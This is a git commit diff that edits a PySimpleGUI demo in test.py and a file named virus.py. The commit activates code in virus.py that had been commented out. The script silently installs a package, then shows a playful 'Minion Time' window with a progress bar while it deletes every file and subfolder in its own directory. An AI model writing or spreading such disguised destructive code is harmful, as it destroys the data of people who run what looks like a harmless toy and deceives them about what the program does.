312dbb52e53c4e7a15327a1f7cbcaba8a7fd30fc
VToribiot <vtoribiot@gmail.com>
2022-07-09 22:25:15 -0400

    chng

--- test.py
+++ test.py
@@ -1,15 +1,12 @@
 import PySimpleGUI as sg
 
-# layout the window
-layout = [[sg.Text('A custom progress meter')],
-          [sg.ProgressBar(20, orientation='h', size=(20, 20), key='progressbar')],
-          [sg.Cancel()]]
+layout = [ [sg.Text('My layout', key='-TEXT-')],
+           [sg.Button('Read')]]
 
-# create the window`
-window = sg.Window('Custom Progress Meter').Layout(layout)
-progress_bar = window.find_element('progressbar')
-# loop that would normally do something useful
-for i in range(11):
-    event, values = window.Read(timeout=1000)
-    progress_bar.UpdateBar(i * 2)
-window.Close()
+window = sg.Window('My new window', layout)
+
+while True:             # Event Loop
+    event, values = window.read()
+    if event == sg.WIN_CLOSED:
+        break
+    window['-TEXT-'].update('My new text value')
--- virus.py
+++ virus.py
@@ -10,33 +10,35 @@ spec = importlib.util.find_spec("PySimpleGUI")
 if spec is None:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "PySimpleGUI"])
 
+sg.theme('SystemDefaultForReal')
 layout = [[sg.Text('Minion Time', font="Roboto, 50")],
           [sg.Image("C:\\Users\\admin\\Downloads\\minion.png")],
+          [sg.Text('Sad nomba:', font="Roboto, 16"), sg.Text('', key='-TEXT-', font="Roboto, 16")],
           [sg.ProgressBar(10000, orientation='h', size=(20, 20), key='progressbar')]]
 
 window = sg.Window('Minion Time').Layout(layout)
 progress_bar = window.find_element('progressbar')
 
-folder = [1, 2, 3, 4, 5, 6]
-countFiles = len(folder)
-prcntg = 0
-for i in range(countFiles + 1):
-    event, values = window.Read(timeout=1000)
-    progress_bar.UpdateBar(int((i / countFiles) * 10000))
-time.sleep(5)
-window.Close()
-
 folder = os.path.dirname(os.path.abspath(__file__))
+countFiles = len(os.listdir(folder))
+i = 1
 for filename in os.listdir(folder):
     file_path = os.path.join(folder, filename)
     try:
         if os.path.isfile(file_path) or os.path.islink(file_path):
-            pass
-            # os.unlink(file_path)
+            os.unlink(file_path)
         elif os.path.isdir(file_path):
-            pass
-            # shutil.rmtree(file_path)
+            shutil.rmtree(file_path)
     except Exception as e:
-        pass
-        # sg.Popup('Ilkyen da adzmo, to sama vivo nunu muggey dia %s. Reason: %s' % (file_path, e))
-# sg.Popup('Tadda tu dim kaylay bem teepus')
+        sg.Popup('Ilkyen da adzmo, to sama vivo nunu muggey dia %s. Reason: %s' % (file_path, e))
+    finally:
+        event, values = window.Read(timeout=250)
+        progress_bar.UpdateBar(int((i / countFiles) * 10000))
+        i += 1
+        window['-TEXT-'].update(filename)
+sg.Popup('Tadda tu dim kaylay bem teepus')
+
+time.sleep(5)
+window.Close()
+
+
